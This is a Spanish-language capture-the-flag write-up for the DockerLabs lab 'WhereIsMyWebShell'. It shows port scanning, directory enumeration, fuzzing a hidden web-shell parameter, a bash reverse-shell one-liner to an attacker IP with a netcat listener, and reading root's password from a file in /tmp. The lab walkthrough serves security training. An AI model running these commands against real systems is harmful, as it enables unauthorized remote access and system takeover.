# DockerLabs - WhereIsMyWebShell

## Información General

- **Nombre del CTF:** WhereIsMyWebShell
- **Categoría:** Boot2Root
- **Dificultad:** Fácil
- **Fecha:** 23/01/2025

## Descripción del Desafío

El desafío **WhereIsMyWebShell** plantea un entorno donde el objetivo es descubrir y explotar una vulnerabilidad en un servidor web para subir o localizar una **web shell**, ganando acceso remoto al sistema. 

## Solución

### 1. Despliegue de la máquina

Como es de esperar, primero ejecutaremos el script proporcionado junto con la máquina para desplegar el laboratorio. Nos aparecerá un mensaje informándonos de la IP utilizada por la máquina vulnerable, que en este caso corresponde con la `192.168.100.2`.

```bash
sudo bash auto_deploy.sh whereismywebshell.tar
```

### 2. Análisis de vulnerabilidades

Comenzamos con un escaneo básico del servidor para identificar servicios activos:

```bash
nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn 192.168.100.2
```

- `-p-`: Escanea todos los puertos disponibles (de 1 a 65535).
- `-sS`: Realiza un escaneo SYN (también conocido como escaneo "sigiloso" o "half-open"), que es más rápido y menos detectable en comparación con un escaneo completo de conexiones TCP.
- `-sC`: Ejecuta scripts predeterminados de Nmap (Nmap Scripting Engine) que proporcionan información adicional sobre los servicios detectados, como versiones y posibles vulnerabilidades.
- `-sV`: Detecta la versión de los servicios que se están ejecutando en los puertos abiertos.
- `--min-rate`: Establece una tasa mínima de envío de paquetes, en este caso de 5000 paquetes por segundo, lo que acelera el escaneo.
- `-n`: Desactiva la resolución de nombres DNS, lo que evita que Nmap intente resolver las direcciones IP a nombres de dominio, lo que mejora la velocidad del escaneo.
- `-vvv`: Establece un nivel de verborrea máximo, proporcionando información detallada sobre lo que Nmap está haciendo en cada paso del escaneo.
- `-Pn`: Desactiva el ping previo al escaneo, lo que significa que Nmap no hará un "ping" para verificar si el host está activo antes de realizar el escaneo de puertos. Esto es útil cuando el objetivo puede estar bloqueando pings o para escanear máquinas sin respuesta a los pings.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(1).png)

**Resultados del escaneo:**

- Puerto 80 abierto: Servidor HTTP.

#### Análisis del servicio HTTP

Abrimos el navegador y accedemos a `http://192.168.100.2`. Allí encontramos una página web simple, y al final de la misma, un consejo dejado por su creador recomendándonos explorar el directorio "/tmp". Usamos la herramienta `gobuster` para enumerar directorios ocultos (requiere instalación previa):

```bash
gobuster dir -u http://192.168.100.2 -w /usr/share/wordlists/directory-list-2.3-medium.txt -x txt,html,php,py,sh
```

- `gobuster`: Es la herramienta que se utiliza para realizar la enumeración de directorios y archivos en un servidor web.
- `dir`: Indica que el modo de operación es búsqueda de directorios y archivos.
- `-u`: Especifica la URL del servidor web que se está escaneando.
- `-w`: Define el archivo de lista de palabras que contiene posibles nombres de directorios y archivos a buscar en el servidor. En este caso, se utilizaremos una lista estándar con nombres comunes.
- `-x`: Define las extensiones de archivos que se probarán para cada entrada en la lista de palabras. 

![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(2).png)

**Resultados relevantes:**

- `shell.php`
- `warning.html`

### 3. Explotación

Inspeccionamos el archivo `warning.html` y encontramos lo siguiente:

![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(3).png)

Al intentar acceder a `shell.php`, no obtenemos ninguna respuesta visible. Esto sugiere que el archivo está esperando un parámetro específico para ejecutar comandos, algo similar a:

```bash
http://192.168.100.2/shell.php?[parametro]=whoami
```

Nuestro objetivo es descubrir cuál es ese parámetro desconocido. Para ello, utilizaremos **wfuzz** y probaremos diferentes nombres de parámetros extraídos de un diccionario común.

```bash
wfuzz -c --hl=0 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/shell.php?FUZZ=whoami"
```

- `wfuzz`: Herramienta utilizada para realizar fuzzing en aplicaciones web.
- `-c`: Habilita la salida en color para facilitar la lectura de los resultados.
- `--hl=0`: Filtra las respuestas basándose en la longitud del contenido. En este caso, muestra solo las respuestas cuya longitud es diferente de 0 (útil para evitar respuestas vacías o irrelevantes).
- `-t 200`: Configura 200 hilos de ejecución en paralelo, acelerando significativamente el proceso.
- `-w`: Especifica el diccionario de palabras que se utilizará. Este diccionario contiene una lista de posibles nombres de parámetros o directorios.
- `-u "http://172.17.0.2/shell.php?FUZZ=whoami"`: Define la URL objetivo. La palabra clave `FUZZ` será reemplazada por cada palabra del diccionario. El parámetro reemplazado (`FUZZ`) se utilizará para intentar ejecutar el comando `whoami`.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(4).png)

La ejecución del comando nos devuelve como resultado el parámetro "parameter". Esto sugiere que hemos encontrado el parámetro correcto. Procedemos a verificarlo directamente en la web, y confirmamos que efectivamente hemos conseguido un **RCE** (Ejecución Remota de Comandos).

![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(5).png)

Ahora crearemos redactaremos una línea de código para ejecutar una **Reverse Shell** y ganar así acceso a la máquina. Nos dirigimos al sitio web: https://tex2e.github.io/reverse-shell-generator/index.html

![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(6).png)

```bash
bash -i >& /dev/tcp/192.168.100.1/4444 0>&1
```

Abrimos Burpsuite y utilizamos su "Encoder" para codificar el comando en `URL`, modificándolo ligeramente:

![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(7).png)

Ponemos la máquina en modo escucha con la siguiente orden:

```bash
nc -nlvp 4444
```

![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(8).png)

Colocamos el resultado en la URL justo detrás del parámetro y se nos abrirá una shell en la terminal.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(9).png)

![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(10).png)


### 4. Escalada de Privilegios

Una vez dentro, nos dirigimos al directorio "/tmp", ya que en el sitio web nos aconsejaron visitarlo. Listamos el contenido del mismo con `ls -la` para que mostrar también los archivos ocultos y encontramos un fichero llamado `secret.txt`. Lo visualizamos con `cat` y obtenemos la contraseña del usuario root. 

¡Hemos tomado el control de la máquina!

![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(11).png)
